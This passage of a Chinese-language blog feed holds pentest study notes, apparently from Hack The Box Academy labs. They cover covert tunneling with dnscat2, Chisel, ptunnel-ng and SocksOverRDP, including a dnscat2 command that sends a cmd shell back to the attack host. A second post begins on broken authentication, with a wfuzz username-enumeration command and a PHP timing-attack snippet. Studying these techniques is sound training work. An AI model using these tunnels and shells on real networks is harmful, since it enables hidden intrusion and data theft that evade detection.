directory域环境都有自己的DNS服务器，该服务器将主机名解析为IP地址，并将流量路由到参与总体DNS系统的外部DNS服务器。但是，对于dnscat2，地址解析是从外部服务器请求的。当本地DNS服务器试图解析地址时，数据会被过滤并通过网络发送，而不是合法的DNS请求。Dnscat2可以是一种极为隐蔽的方法来过滤数据，同时避免防火墙检测，因为防火墙检测会剥离HTTPS连接并探查流量。对于我们的测试示例，我们可以在攻击主机上使用dnscat2服务器，并在另一台Windows主机上执行dnscat2客户端。</p><h2 id="Setting-Up-amp-Using-dnscat2"><a href="#Setting-Up-amp-Using-dnscat2" class="headerlink" title="Setting Up &amp; Using dnscat2"></a>Setting Up &amp; Using dnscat2</h2><p>如果dnscat2尚未在我们的攻击主机上设置，我们可以使用以下命令进行设置：</p><h4 id="Cloning-dnscat2-and-Setting-Up-the-Server"><a href="#Cloning-dnscat2-and-Setting-Up-the-Server" class="headerlink" title="Cloning dnscat2 and Setting Up the Server"></a>Cloning dnscat2 and Setting Up the Server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git</code></pre><h4 id="Starting-the-dnscat2-server"><a href="#Starting-the-dnscat2-server" class="headerlink" title="Starting the dnscat2 server"></a>Starting the dnscat2 server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache</code></pre><p>运行服务器后，它将向我们提供密钥，我们必须将密钥提供给Windows主机上的dnscat2客户端，以便它可以对发送到外部dnscat2服务器的数据进行身份验证和加密。我们可以将客户端与dnscat2项目一起使用，也可以使用 <a href="https://github.com/lukebaggett/dnscat2-powershell">dnscat2-powershell</a>，这是一个基于dnscat2兼容powershell的客户端，我们可以从Windows目标运行该客户端，以与我们的dnscat2服务器建立隧道。我们可以将包含客户端文件的项目克隆到我们的攻击主机，然后将其传输到目标。</p><h4 id="Cloning-dnscat2-powershell-to-the-Attack-Host"><a href="#Cloning-dnscat2-powershell-to-the-Attack-Host" class="headerlink" title="Cloning dnscat2-powershell to the Attack Host"></a>Cloning dnscat2-powershell to the Attack Host</h4><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git</code></pre><p>一旦dnscat2.ps1文件在目标上，我们就可以导入它并运行相关的cmdlet。</p><h4 id="Importing-dnscat2-ps1"><a href="#Importing-dnscat2-ps1" class="headerlink" title="Importing dnscat2.ps1"></a>Importing dnscat2.ps1</h4><pre><code class="powershell-session">PS C:\htb&gt; Import-Module .\dnscat2.ps1</code></pre><p>导入dnscat2.ps1后，我们可以使用它与运行在我们攻击主机上的服务器建立隧道。我们可以将CMD shell会话发送回我们的服务器。</p><pre><code class="powershell-session">PS C:\htb&gt; Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd </code></pre><p>我们必须使用服务器上生成的预共享机密（-PreSharedSecret）来确保我们的会话已建立并加密。如果所有步骤都成功完成，我们将看到与服务器建立的会话。</p><h4 id="Confirming-Session-Establishment"><a href="#Confirming-Session-Establishment" class="headerlink" title="Confirming Session Establishment"></a>Confirming Session Establishment</h4><pre><code class="shell-session">New window created: 1Session 1 Security: ENCRYPTED AND VERIFIED!(the security depends on the strength of your pre-shared secret!)dnscat2&gt;</code></pre><p>我们可以通过输入？列出dnscat2的选项？在提示下。</p><pre><code class="shell-session">dnscat2&gt; ?Here is a list of commands (use -h on any of them for additional help):* echo* help* kill* quit* set* start* stop* tunnels* unset* window* windows</code></pre><p>我们可以使用dnscat2与会话进行交互，并在参与的目标环境中进一步移动。在本模块中，我们不会涵盖dnscat2的所有可能性，但我们强烈鼓励您使用它进行练习，甚至可能找到创造性的方法在参与中使用它。让我们与已建立的会话进行交互，然后进入shell。</p><h4 id="Interacting-with-the-Established-Session"><a href="#Interacting-with-the-Established-Session" class="headerlink" title="Interacting with the Established Session"></a>Interacting with the Established Session</h4><pre><code class="shell-session">dnscat2&gt; window -i 1New window created: 1history_size (session) =&gt; 1000Session 1 Security: ENCRYPTED AND VERIFIED!(the security depends on the strength of your pre-shared secret!)This is a console session!That means that anything you type will be sent as-is to theclient, and anything they type will be displayed as-is on thescreen! If the client is executing a command and you don&#39;tsee a prompt, try typing &#39;pwd&#39; or something!To go back, type ctrl-z.Microsoft Windows [Version 10.0.18363.1801](c) 2019 Microsoft Corporation. All rights reserved.C:\Windows\system32&gt;exec (OFFICEMANAGER) 1&gt;</code></pre><h1 id="SOCKS5-Tunneling-with-Chisel"><a href="#SOCKS5-Tunneling-with-Chisel" class="headerlink" title="SOCKS5 Tunneling with Chisel"></a>SOCKS5 Tunneling with Chisel</h1><p><a href="https://github.com/jpillora/chisel">Chisel</a> </p><p>Chisel是一个用Go编写的基于TCP&#x2F;UDP的隧道工具，它使用HTTP传输使用SSH保护的数据。Chisel可以在防火墙受限的环境中创建客户端-服务器隧道连接。让我们考虑一种情况，即我们必须通过隧道将流量传输到172.16.5.0&#x2F;23网络（内部网络）上的Web服务器。我们有地址为172.16.5.19的域控制器。由于我们的攻击主机和域控制器属于不同的网段，因此攻击主机无法直接访问它。然而，由于我们已经破坏了Ubuntu服务器，我们可以在其上启动一个Chisel服务器，该服务器将监听特定端口，并通过已建立的隧道将我们的流量转发到内部网络。</p><h2 id="Setting-Up-amp-Using-Chisel"><a href="#Setting-Up-amp-Using-Chisel" class="headerlink" title="Setting Up &amp; Using Chisel"></a>Setting Up &amp; Using Chisel</h2><p>在我们使用Chisel之前，我们需要在我们的攻击主机上安装它。如果我们的攻击主机上没有Chisel，我们可以使用下面的命令克隆项目repo：</p><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/jpillora/chisel.git</code></pre><p>我们需要在系统上安装编程语言Go来构建Chisel二进制文件。在系统上安装Go后，我们可以进入该目录，并使用Go-build构建Chisel二进制文件。</p><h4 id="Building-the-Chisel-Binary"><a href="#Building-the-Chisel-Binary" class="headerlink" title="Building the Chisel Binary"></a>Building the Chisel Binary</h4><pre><code class="shell-session">Tanin@htb[/htb]$ cd chiselgo build</code></pre><p>注意我们传输到客户网络上目标上的文件的大小可能会有所帮助，这不仅是出于性能原因，还考虑到检测。补充这一特定概念的两个有益资源是Oxdf的博客文章“<a href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html">Tunneling with Chisel and SSF</a>”和IppSec对盒子Reddish的演练。IppSec在视频的24:29开始解释Chisel，构建二进制并缩小二进制的大小。 一旦构建了二进制文件，我们就可以使用SCP将其传输到目标枢轴主机。</p><pre><code class="shell-session">anin@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/ ubuntu@10.129.202.64&#39;s password: chisel                                        100%   11MB   1.2MB/s   00:09    </code></pre><p>Then we can start the Chisel server&#x2F;listener.</p><h4 id="Running-the-Chisel-Server-on-the-Pivot-Host"><a href="#Running-the-Chisel-Server-on-the-Pivot-Host" class="headerlink" title="Running the Chisel Server on the Pivot Host"></a>Running the Chisel Server on the Pivot Host</h4><pre><code class="shell-session">ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks52022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234</code></pre><p>Chisel侦听器将使用SOCKS5（–SOCKS5）侦听端口1234上的传入连接，并将其转发到可从枢轴主机访问的所有网络。在我们的案例中，枢轴主机在172.16.5.0&#x2F;23网络上有一个接口，这将允许我们访问该网络上的主机。 我们可以在攻击主机上启动客户端并连接到Chisel服务器。</p><h4 id="Connecting-to-the-Chisel-Server"><a href="#Connecting-to-the-Chisel-Server" class="headerlink" title="Connecting to the Chisel Server"></a>Connecting to the Chisel Server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:12342022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=&gt;socks: Listening2022/05/05 14:21:18 client: tun: Bound proxies2022/05/05 14:21:19 client: Handshaking...2022/05/05 14:21:19 client: Sending config2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)2022/05/05 14:21:19 client: tun: SSH connected</code></pre><p>正如您在上面的输出中看到的，Chisel客户端已经通过HTTP在Chisel服务器和客户端之间创建了一个TCP&#x2F;UDP隧道，该隧道使用SSH进行安全保护，并且已经开始在1080端口上侦听。现在，我们可以修改位于&#x2F;etc&#x2F;proxychans.conf的proxychans.cconf文件，并在末尾添加1080端口，这样我们就可以使用proxychans使用创建的1080端口和SSH隧道之间的隧道进行透视。</p><pre><code class="shell-session">Tanin@htb[/htb]$ tail -f /etc/proxychains.conf ##       proxy types: http, socks4, socks5#        ( auth types supported: &quot;basic&quot;-http  &quot;user/pass&quot;-socks )#[ProxyList]# add proxy here ...# meanwile# defaults set to &quot;tor&quot;# socks4 127.0.0.1 9050socks5 127.0.0.1 1080</code></pre><p>现在，如果我们使用RDP的proxychains，我们可以通过我们创建的到Pivot主机的隧道连接到内部网络上的DC。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123</code></pre><h2 id="Chisel-Reverse-Pivot"><a href="#Chisel-Reverse-Pivot" class="headerlink" title="Chisel Reverse Pivot"></a>Chisel Reverse Pivot</h2><p>在前面的例子中，我们使用受损的机器（Ubuntu）作为Chisel服务器，在端口1234上列出。尽管如此，在某些情况下，防火墙规则可能会限制与受损目标的入站连接。在这种情况下，我们可以将Chisel与反向选项一起使用。 当Chisel服务器启用了–reverse时，remotes可以加上前缀R来表示reverse。服务器将侦听并接受连接，并且它们将通过指定远程的客户端进行代理。指定R:socks的反向远程将侦听服务器的默认socks端口（1080），并终止客户端内部SOCKS5代理的连接。 我们将使用选项–reverse在攻击主机中启动服务器。</p><h4 id="Starting-the-Chisel-Server-on-our-Attack-Host"><a href="#Starting-the-Chisel-Server-on-our-Attack-Host" class="headerlink" title="Starting the Chisel Server on our Attack Host"></a>Starting the Chisel Server on our Attack Host</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks52022/05/30 10:19:16 server: Reverse tunnelling enabled2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234</code></pre><p>我们可以使用任何编辑器来编辑proxyains.conf文件，然后使用tail确认我们的配置更改。</p><pre><code class="shell-session">Tanin@htb[/htb]$ tail -f /etc/proxychains.conf [ProxyList]# add proxy here ...# socks4    127.0.0.1 9050socks5 127.0.0.1 1080 </code></pre><p>如果我们将proxychains与RDP一起使用，我们可以通过我们创建的到Pivot主机的隧道连接到内部网络上的DC。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123</code></pre><h1 id="ICMP-Tunneling-with-SOCKS"><a href="#ICMP-Tunneling-with-SOCKS" class="headerlink" title="ICMP Tunneling with SOCKS"></a>ICMP Tunneling with SOCKS</h1><p>ICMP隧道将您的流量封装在包含回显请求和响应的ICMP数据包中。ICMP隧道只有在防火墙网络中允许ping响应时才能工作。当防火墙网络中的主机被允许对外部服务器进行ping时，它可以将其流量封装在ping回显请求中，并将其发送到外部服务器。外部服务器可以验证此流量并发送适当的响应，这对于数据泄露和创建到外部服务器的数据透视隧道非常有用。 我们将使用ptunnel ng工具在Ubuntu服务器和攻击主机之间创建一个隧道。一旦创建了隧道，我们将能够通过 <a href="https://github.com/utoni/ptunnel-ng">ptunnel-ng</a> 客户端代理我们的流量。我们可以在目标pivot主机上启动ptunnel ng服务器。让我们从设置ptunnel ng开始。</p><h2 id="Setting-Up-amp-Using-ptunnel-ng"><a href="#Setting-Up-amp-Using-ptunnel-ng" class="headerlink" title="Setting Up &amp; Using ptunnel-ng"></a>Setting Up &amp; Using ptunnel-ng</h2><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/utoni/ptunnel-ng.git</code></pre><h4 id="Building-Ptunnel-ng-with-Autogen-sh"><a href="#Building-Ptunnel-ng-with-Autogen-sh" class="headerlink" title="Building Ptunnel-ng with Autogen.sh"></a>Building Ptunnel-ng with Autogen.sh</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo ./autogen.sh </code></pre><p>在运行autogen.sh之后，可以从客户端和服务器端使用ptunnel ng。我们现在需要将回购从我们的攻击主机转移到目标主机。如前几节所述，我们可以使用SCP来传输文件。如果我们想传输整个repo和其中包含的文件，我们需要将-r选项与SCP一起使用。 将Ptunnel ng传输到数据透视主机</p><pre><code class="shell-session">Tanin@htb[/htb]$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/</code></pre><h4 id="Starting-the-ptunnel-ng-Server-on-the-Target-Host"><a href="#Starting-the-ptunnel-ng-Server-on-the-Target-Host" class="headerlink" title="Starting the ptunnel-ng Server on the Target Host"></a>Starting the ptunnel-ng Server on the Target Host</h4><pre><code class="shell-session">ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22[sudo] password for ubuntu: ./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng)[inf]: Starting ptunnel-ng 1.42.[inf]: (c) 2004-2011 Daniel Stoedle, &lt;daniels@cs.uit.no&gt;[inf]: (c) 2017-2019 Toni Uhlig,     &lt;matzeton@googlemail.com&gt;[inf]: Security features by Sebastien Raveau, &lt;sebastien.raveau@epita.fr&gt;[inf]: Forwarding incoming ping packets over TCP.[inf]: Ping proxy is listening in privileged mode.[inf]: Dropping privileges now.</code></pre><p>-r后面的IP地址应该是我们希望ptunnel ng接受连接的IP。在这种情况下，我们将使用从我们的攻击主机可以访问的任何IP。在实际参与过程中使用同样的想法和考虑会使我们受益。 回到攻击主机上，我们可以尝试连接到ptunnel ng服务器（-p＜ipAddress-Target＞），但要确保通过本地端口2222（-l2222）进行连接。通过本地端口2222连接允许我们通过ICMP隧道发送流量。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22[inf]: Starting ptunnel-ng 1.42.[inf]: (c) 2004-2011 Daniel Stoedle, &lt;daniels@cs.uit.no&gt;[inf]: (c) 2017-2019 Toni Uhlig,     &lt;matzeton@googlemail.com&gt;[inf]: Security features by Sebastien Raveau, &lt;sebastien.raveau@epita.fr&gt;[inf]: Relaying packets from incoming TCP streams.</code></pre><p>随着ptunnel ng ICMP隧道的成功建立，我们可以尝试通过本地端口2222（-p2222）使用SSH连接到目标。</p><pre><code class="shell-session">Tanin@htb[/htb]$ ssh -p2222 -lubuntu 127.0.0.1</code></pre><p>如果配置正确，我们将能够通过ICMP隧道输入凭据并进行SSH会话。 在连接的客户端和服务器端，我们会注意到ptunnel ng为我们提供了与通过ICMP隧道的流量相关的会话日志和流量统计信息。这是我们可以使用ICMP确认流量从客户端传递到服务器的一种方式。</p><h4 id="Enabling-Dynamic-Port-Forwarding-over-SSH"><a href="#Enabling-Dynamic-Port-Forwarding-over-SSH" class="headerlink" title="Enabling Dynamic Port Forwarding over SSH"></a>Enabling Dynamic Port Forwarding over SSH</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1ubuntu@127.0.0.1&#39;s password: Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)&lt;snip&gt;</code></pre><p>我们可以使用带有Nmap的proxychains扫描内部网络上的目标（172.16.5.x）。根据我们的发现，我们可以尝试连接到目标。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains nmap -sV -sT 172.16.5.19 -p3389</code></pre><h2 id="Network-Traffic-Analysis-Considerations"><a href="#Network-Traffic-Analysis-Considerations" class="headerlink" title="Network Traffic Analysis Considerations"></a>Network Traffic Analysis Considerations</h2><p>重要的是，我们要确认我们正在使用的工具是否如广告所示，并且我们已经设置并正确操作了它们。在使用ICMP隧道通过本节中教导的不同协议对流量进行隧道传输的情况下，我们可以从使用Wireshark等数据包分析器分析生成的流量中受益。仔细看一下下面的短片。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309041725504.gif" alt="img"></p><p>在这个片段的第一部分中，通过SSH建立连接，而不使用ICMP隧道。我们可能会注意到，TCP&amp;SSHv2流量被捕获。 剪辑中使用的命令：<a href="mailto:&#x73;&#x73;&#x68;&#117;&#x62;&#117;&#x6e;&#116;&#117;&#x40;&#x31;&#48;&#46;&#49;&#50;&#57;&#46;&#x32;&#x30;&#x32;&#x2e;&#54;&#52;">&#x73;&#x73;&#x68;&#117;&#x62;&#117;&#x6e;&#116;&#117;&#x40;&#x31;&#48;&#46;&#49;&#50;&#57;&#46;&#x32;&#x30;&#x32;&#x2e;&#54;&#52;</a> 在本片段的第二部分中，使用ICMP隧道通过SSH建立连接。请注意执行此操作时捕获的流量类型。 剪辑中使用的命令：ssh-p222-lubuntu 127.0.0.1</p><h1 id="RDP-and-SOCKS-Tunneling-with-SocksOverRDP"><a href="#RDP-and-SOCKS-Tunneling-with-SocksOverRDP" class="headerlink" title="RDP and SOCKS Tunneling with SocksOverRDP"></a>RDP and SOCKS Tunneling with SocksOverRDP</h1><p>在评估过程中，有时我们可能仅限于Windows网络，并且可能无法使用SSH进行数据透视。在这种情况下，我们必须使用适用于Windows操作系统的工具。SocksOverRDP是一个使用Windows远程桌面服务功能中的动态虚拟频道（DVC）的工具示例。DVC负责通过RDP连接对数据包进行隧道传输。使用此功能的一些示例是剪贴板数据传输和音频共享。然而，此功能也可用于通过网络传输任意数据包。我们可以使用SocksOverRDP来传输我们的自定义数据包，然后通过它进行代理。我们将使用工具Proxifier作为我们的代理服务器。 我们可以从将适当的二进制文件下载到我们的攻击主机开始执行此攻击。在我们的攻击主机上拥有二进制文件将使我们能够将它们转移到需要的每个目标。我们需要：</p><p> <a href="https://github.com/nccgroup/SocksOverRDP/releases">SocksOverRDP x64 Binaries</a>二进制文件</p><p><a href="https://www.proxifier.com/download/#win-tab">Proxifier Portable Binary</a></p><p> 我们可以查找ProxifierPE.zip 然后，我们可以使用xfreerdp连接到目标，并将SocksOverRDP64.zip文件复制到目标。然后，我们需要从Windows目标加载使用regsvr32.exe的SocksOverRDP.dll。</p><h4 id="Loading-SocksOverRDP-dll-using-regsvr32-exe"><a href="#Loading-SocksOverRDP-dll-using-regsvr32-exe" class="headerlink" title="Loading SocksOverRDP.dll using regsvr32.exe"></a>Loading SocksOverRDP.dll using regsvr32.exe</h4><pre><code class="cmd-session">C:\Users\htb-student\Desktop\SocksOverRDP-x64&gt; regsvr32.exe SocksOverRDP-Plugin.dll</code></pre><p>现在，我们可以使用mstsc.exe通过RDP连接到172.16.5.19，我们应该会收到一个提示，即SocksOverRDP插件已启用，它将在127.0.0.1:1080上侦听。我们可以使用胜利者的凭据：pass@123连接到172.16.5.19。</p><p>我们需要将SocksOverRDP64.zip或仅将SocksOverRDP-Server.exe传输到172.16.5.19。然后，我们可以使用管理员权限启动SocksOverRDP-Server.exe。</p><p>当我们回到我们的立足点目标并查看Netstat时，我们应该会看到我们的SOCKS侦听器在127.0.0.1:1080。</p><pre><code class="cmd-session">C:\Users\htb-student\Desktop\SocksOverRDP-x64&gt; netstat -antb | findstr 1080  TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING</code></pre><p>启动我们的侦听器后，我们可以将Proxizer便携式传输到Windows 10目标（在10.129.x.x网络上），并将其配置为将我们的所有数据包转发到127.0.0.1:1080。Proxifier将通过给定的主机和端口路由流量。有关配置Proxifier的快速演练，请参阅下面的片段。</p><h4 id="Configuring-Proxifier"><a href="#Configuring-Proxifier" class="headerlink" title="Configuring Proxifier"></a>Configuring Proxifier</h4><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309041754536.gif" alt="img"></p><p>配置并运行Proxizer后，我们可以启动mstsc.exe，它将使用Proxizer通过127.0.0.1:1080将我们的所有流量进行枢轴传输，这将通过RDP将其传输到172.16.5.19，然后通过SocksOverRDP-server.exe将其路由到172.16.6.155。</p><h4 id="RDP-Performance-Considerations"><a href="#RDP-Performance-Considerations" class="headerlink" title="RDP Performance Considerations"></a>RDP Performance Considerations</h4><p>当在约定中与RDP会话交互时，我们可能会发现自己在给定会话中遇到性能缓慢的问题，尤其是当我们同时管理多个RDP会话时。如果是这种情况，我们可以访问mstsc.exe中的“体验”选项卡，并将“性能”设置为“调制解调器”。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309041755688.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SSH-for-Windows-plink-exe&quot;&gt;&lt;a href=&quot;#SSH-for-Windows-plink-exe&quot; class=&quot;headerlink&quot; title=&quot;SSH for Windows: plink.exe&quot;&gt;&lt;/a&gt;SSH for Wi</summary>
      
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Broken Authentication</title>
    <link href="https://taninluv.github.io/2023/09/01/Broken-Authentication/"/>
    <id>https://taninluv.github.io/2023/09/01/Broken-Authentication/</id>
    <published>2023-09-01T08:08:19.000Z</published>
    <updated>2023-09-06T03:17:22.996Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Overview-of-Attacks-Against-Authentication"><a href="#Overview-of-Attacks-Against-Authentication" class="headerlink" title="Overview of Attacks Against Authentication"></a>Overview of Attacks Against Authentication</h1><p>身份验证攻击总共可以针对三个域进行。这三个领域分为以下几类： <strong>HAS域（拥有的东西）</strong> <strong>IS域（所知信息）</strong> <strong>KNOWS域（所知的事情）</strong></p><span id="more"></span><h2 id="Attacking-the-HAS-Domain"><a href="#Attacking-the-HAS-Domain" class="headerlink" title="Attacking the HAS Domain"></a>Attacking the HAS Domain</h2><p>谈到在涵盖Multi-Factor Authentication时描述的三个域，has域看起来很简单，因为我们要么拥有硬件令牌，要么没有。然而，事情比表面上看起来更复杂： 徽章可以在不被接管的情况下被克隆 用于生成一次性密码的加密算法可能会被破坏 任何物理设备都可能被盗 远程天线可以轻松实现50厘米的工作距离，并复制经典的NFC徽章。你可能认为攻击者必须非常靠近受害者才能成功地执行这样的攻击。想想在使用公共交通工具或在商店排队等候时，我们坐得有多近，你可能会改变主意。每天都有多个人可以进行这样的克隆攻击。 想象一下，你正在办公室附近的酒吧吃快餐。你甚至没有注意到有袭击者从你的座位旁走过，因为你正忙于一项紧急的工作任务。他们刚刚克隆了你口袋里的徽章！！！几分钟后，他们将您的徽章信息转移到一个干净的代币中，并在吃午饭时使用它进入您公司的大楼。 很明显，克隆企业徽章并没有那么困难，而且后果可能很严重。</p><h2 id="Attacking-the-IS-Domain"><a href="#Attacking-the-IS-Domain" class="headerlink" title="Attacking the IS Domain"></a>Attacking the IS Domain</h2><p>你可能会认为is域是最难攻击的。如果一个人依靠“某物”来证明自己的身份，而这个“某物”被破坏了，他们就会失去证明自己身份的独特方式，因为没有人可以改变他们的身份。视网膜扫描、指纹读取器、面部识别都被证明是可以破解的。所有这些都可以通过第三方泄露、高清图片、吝啬鬼，甚至是偷对玻璃的邪恶女仆来破解。 销售基于is域的安全措施的公司表示，它们非常安全。2019年8月，一家制造通过移动或网络应用程序管理的生物识别智能锁的公司被攻破。该公司使用指纹或面部识别来识别授权用户。该漏洞暴露了所有指纹和面部模式，包括用户名和密码、授权和注册用户的地址。虽然用户可以轻松更改密码并减轻问题，但任何能够复制指纹或面部图案的人仍然可以解锁和管理这些智能锁。</p><h2 id="Attacking-the-KNOWS-Domain"><a href="#Attacking-the-KNOWS-Domain" class="headerlink" title="Attacking the KNOWS Domain"></a>Attacking the KNOWS Domain</h2><p>knows领域是我们将在本模块中深入研究的领域。这是最简单的理解，但我们应该深入了解每一个方面，因为它也是最广泛的。这个域指的是用户知道的东西，比如用户名或密码。在本模块中，我们将仅针对FBA进行工作。请记住，同样的方法也可以适用于HTTP身份验证实现。</p><h1 id="Default-Credentials"><a href="#Default-Credentials" class="headerlink" title="Default Credentials"></a>Default Credentials</h1><p> <a href="https://www.cirt.net/passwords">web database</a></p><h1 id="Weak-Bruteforce-Protections"><a href="#Weak-Bruteforce-Protections" class="headerlink" title="Weak Bruteforce Protections"></a>Weak Bruteforce Protections</h1><p>在深入研究攻击之前，我们必须了解在测试过程中可能遇到的保护措施。如今，有许多不同的安全机制旨在防止自动攻击。最常见的有以下几种。</p><ul><li><code>CAPTCHA</code></li><li><code>Rate Limits</code></li></ul><p> 此外，web开发人员经常创建自己的安全机制，使测试过程对我们来说更“有趣”，因为这些自定义安全机制可能包含我们可以利用的漏洞。让我们首先熟悉针对自动攻击的常见安全机制，以了解它们的功能，并为针对它们的攻击做好准备。</p><h2 id="CAPTCHA"><a href="#CAPTCHA" class="headerlink" title="CAPTCHA"></a>CAPTCHA</h2><p><a href="https://en.wikipedia.org/wiki/CAPTCHA">CAPTCHA</a></p><p>一种广泛使用的安全措施，以“告诉计算机和人类分开的全自动公共图灵测试”这句话命名，可以有很多不同的形式。例如，它可能需要键入图像上的单词，听到一个简短的音频样本并将你听到的内容输入到表格中，将图像与给定的模式匹配，或者执行基本的数学运算。</p><p>尽管CAPTCHA在过去已经被成功绕过，但它对自动攻击仍然非常有效。应用程序至少应该要求用户在几次尝试失败后解决CAPTCHA问题。一些开发人员经常完全跳过这种保护，而另一些开发人员则更喜欢在登录失败后提供CAPTCHA，以保持良好的用户体验。 开发人员也可以使用CAPTCHA的自定义或弱实现，例如，图像的名称由图像中包含的字符组成。保护不力往往比没有保护更糟糕，因为它提供了一种虚假的安全感。下图显示了一个弱实现，PHP代码将图像的内容放入id字段。这种类型的弱实现是罕见的，但并非不可能。</p><p><img src="https://academy.hackthebox.com/storage/modules/80/06-captcha_id.png" alt="img"></p><p>作为攻击者，我们只需读取页面的源代码即可找到CAPTCHA代码的值并绕过保护。我们应该始终阅读源代码。 作为开发人员，我们不应该开发自己的CAPTCHA，而应该依赖一个经过良好测试的CAPTCHA，并在很少失败登录后需要它。</p><h2 id="Rate-Limiting"><a href="#Rate-Limiting" class="headerlink" title="Rate Limiting"></a>Rate Limiting</h2><h2 id="Insufficient-Protections"><a href="#Insufficient-Protections" class="headerlink" title="Insufficient Protections"></a>Insufficient Protections</h2><p>当攻击者可以篡改为提高安全性而考虑的数据时，他们可以绕过所有或部分保护。例如，更改用户代理标头很容易。一些web应用程序或web应用程序防火墙利用X-Forwarded-For等标头来猜测实际的源IP地址。这样做是因为许多互联网提供商、移动运营商或大公司通常将用户“隐藏”在NAT后面。在没有X-Forwarded-For等标头帮助的情况下阻止IP地址可能会导致阻止特定NAT后面的所有用户。</p><h1 id="Brute-Forcing-Usernames"><a href="#Brute-Forcing-Usernames" class="headerlink" title="Brute Forcing Usernames"></a>Brute Forcing Usernames</h1><p>用户名枚举经常被忽视，可能是因为人们认为用户名不是私人信息。当你给另一个用户写消息时，我们通常认为我们知道他们的用户名、电子邮件地址等。同一个用户名经常被重复用于访问其他服务，如FTP、RDP和SSH等。由于许多web应用程序允许我们识别用户名，我们应该利用这一功能，并将其用于以后的攻击。</p><p>广泛的web应用程序都存在此漏洞。 用户名通常远没有密码复杂。当它们不是电子邮件地址时，很少包含特殊字符。拥有一个常见用户列表会给攻击者带来一些优势。除了获得良好的用户体验（UX）外，遇到随机或不易预测的用户名也很少见。用户将比计算机生成的（伪）随机用户名更容易记住他们的电子邮件地址或昵称。 拥有有效用户名列表，攻击者可以缩小暴力攻击的范围，或对支持员工或用户本身进行有针对性的攻击（利用OSINT）。此外，一个通用密码可以很容易地被喷到有效的帐户上，通常会导致成功的帐户泄露。 应该注意的是，用户名也可以通过抓取网络应用程序或使用公共信息来获取，例如社交网络上的公司简介。 防止用户名枚举攻击可能会影响用户体验。网络应用程序显示用户名是否存在可能有助于合法用户识别他们未能正确键入用户名，但这同样适用于试图确定有效用户名的攻击者。即使是像WordPress这样知名且成熟的web框架，也会受到用户枚举的影响，因为开发团队选择通过降低框架的安全级别来获得更流畅的用户体验。</p><h2 id="User-Unknown-Attack"><a href="#User-Unknown-Attack" class="headerlink" title="User Unknown Attack"></a>User Unknown Attack</h2><pre><code class="shell-session">Tanin@htb[/htb]$ wfuzz -c -z file,/opt/useful/SecLists/Usernames/top-usernames-shortlist.txt -d &quot;Username=FUZZ&amp;Password=dummypass&quot; --hs &quot;Unknown username&quot; http://brokenauthentication.hackthebox.eu/user_unknown.php</code></pre><h2 id="Username-Existence-Inference"><a href="#Username-Existence-Inference" class="headerlink" title="Username Existence Inference"></a>Username Existence Inference</h2><p>有时，web应用程序可能不会明确声明它不知道特定的用户名，但允许攻击者推断这条信息。如果用户名有效且已知，则某些web应用程序会预先填充用户名输入值，但如果用户名未知，则保留输入值为空或使用默认值。这在移动版本的网站上很常见，我们之前看到的易受攻击的WordPress登录页面也是如此。在开发过程中，始终尝试为失败登录和授权登录提供相同的体验：即使是微小的差异也足以推断出一条信息。</p><p>虽然不常见，但当用户名有效或无效时，也可能设置不同的cookie。例如，要使用客户端控件检查密码尝试，web应用程序可以设置一个名为“failed_login”的cookie，然后仅在用户名有效时检查该cookie。仔细检查响应，注意HTTP头和HTML源代码中的差异。</p><h2 id="Timing-Attack"><a href="#Timing-Attack" class="headerlink" title="Timing Attack"></a>Timing Attack</h2><p>某些身份验证功能在设计上可能存在缺陷。一个示例是身份验证函数，其中按顺序检查用户名和密码。让我们分析一下下面的程序。</p><pre><code class="php">&lt;?php// connect to database$db = mysqli_connect(&quot;localhost&quot;, &quot;dbuser&quot;, 